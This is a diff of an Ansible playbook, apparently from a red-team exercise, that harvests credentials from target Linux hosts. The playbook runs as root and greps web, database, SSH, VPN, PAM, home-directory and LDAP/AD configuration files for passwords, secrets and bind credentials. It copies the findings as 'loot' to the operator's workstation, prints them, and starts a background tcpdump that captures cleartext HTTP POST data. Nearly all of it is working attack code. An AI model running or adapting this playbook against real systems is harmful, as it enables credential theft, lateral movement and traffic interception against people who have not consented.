@@ -1,41 +1,41 @@
 ---
-# SECTION 1: DATABASE & WEB CREDENTIALS (SCP-APACHE-01 & SCP-DATABASE-01)
+# SECTION 1: DATABASE & WEB CREDENTIALS (Target: SCP-APACHE-01, SCP-DATABASE-01)
 - name: Extract Database and Web Credentials
   become: yes
   shell: |
-    # Targets /var/www and mysql configs. 
-    # Excludes wp-includes/wp-admin to stop "regex vomit"
-    grep -rEo "(db_user|db_pass|db_name|db_host|password|passwd)[:=]\s*['\"]?[^'\" \t\n;]{4,32}['\"]?" /var/www /etc/mysql /etc/apache2 2>/dev/null \
-    | grep -vE "(wp-includes|wp-admin|node_modules|js/|css/|.svg|.png|None)" \
+    # Searches /var/www and /etc/mysql for DB/Web credentials.
+    # Specifically excludes the core WordPress directories that cause "noise".
+    grep -rEo "(db_user|db_pass|db_name|db_host|password|passwd)[:=]\s*['\"]?[^'\" \t\n;]{3,40}['\"]?" /var/www /etc/mysql /etc/apache2 2>/dev/null \
+    | grep -vE "(wp-includes/|wp-admin/|node_modules/|vendor/|js/|css/|.svg|.png)" \
     | sort -u
   register: db_results
   failed_when: false
   changed_when: false
 
-# SECTION 2: SYSTEM & SERVICE CREDENTIALS (SCP-OPENSSH-01 & SCP-OPENVPN-01)
+# SECTION 2: SYSTEM & SERVICE CREDENTIALS (Target: SCP-OPENSSH-01, SCP-OPENVPN-01)
 - name: Extract System and VPN Credentials
   become: yes
   shell: |
-    # Scans SSH and VPN configs for cleartext secrets or key paths
-    grep -rEo "(password|passwd|auth_user|secret|key_pass|bind_pw)\s*[:=]\s*['\"]?[^'\" \t\n;]{4,32}['\"]?" /etc/ssh /etc/openvpn /etc/pam.d /home 2>/dev/null \
+    # Scans /etc/ssh and /etc/openvpn for cleartext secrets, keys, or auth configs.
+    grep -rEo "(password|passwd|auth_user|secret|key_pass|bind_pw)\s*[:=]\s*['\"]?[^'\" \t\n;]{3,40}['\"]?" /etc/ssh /etc/openvpn /etc/pam.d /home 2>/dev/null \
     | grep -vE "(\.js|passwd: files|passwd: False|No matches)" \
     | sort -u
   register: system_results
   failed_when: false
   changed_when: false
 
-# SECTION 3: AD/LDAP BIND INFO (Lateral movement to SCP-DC-01)
+# SECTION 3: AD/LDAP BIND INFO (Target: SCP-DC-01 connectivity)
 - name: Extract AD and LDAP Bind Info
   become: yes
   shell: |
-    # Looks for LDAP bind DNs and passwords used for Windows AD integration
-    grep -rEio "(bind_dn|bind_pw|ad_domain|ad_server)[:=]\s*[^ \t\n;]+" /etc/sssd /etc/ldap /etc/samba 2>/dev/null \
+    # Scans for LDAP/AD bind credentials often used for centralized auth on Linux nodes.
+    grep -rEio "(bind_dn|bind_pw|ad_domain|ad_server|ldap_uri|ldap_password)[:=]\s*[^ \t\n;]+" /etc/sssd /etc/ldap /etc/samba /etc/autofs 2>/dev/null \
     | sort -u
   register: ad_bind_results
   failed_when: false
   changed_when: false
 
-# SECTION 4: DELIVERY
+# SECTION 4: DELIVERY (Saves to local loot folder)
 - name: Deliver Organized Service Loot
   delegate_to: localhost
   copy:
@@ -54,7 +54,7 @@
   become: no
   when: db_results.stdout != "" or system_results.stdout != "" or ad_bind_results.stdout != ""
 
-# SECTION 5: LIVE ALERT
+# SECTION 5: LIVE ALERT (Terminal Output)
 - name: CATEGORIZED LOOT ALERT
   debug:
     msg:
@@ -66,10 +66,11 @@
       - "{{ ad_bind_results.stdout_lines | default(['None']) }}"
   when: db_results.stdout != "" or system_results.stdout != "" or ad_bind_results.stdout != ""
 
+# SECTION 6: NETWORK SNIFFER (Run once on Red Workstation)
 - name: Start Background Network Sniffer
   delegate_to: localhost
   shell: |
-    # Update ens8 if your workstation interface name differs
+    # Change ens8 to your Red Workstation's interface (check 'ip a')
     nohup tcpdump -i ens8 -A -nn -l 'tcp port 80 and (tcp[((tcp[12:1]) >> 2):4] = 0x504f5354)' > {{ playbook_dir }}/loot/network_sniff.log 2>&1 &
   run_once: true
   become: yes
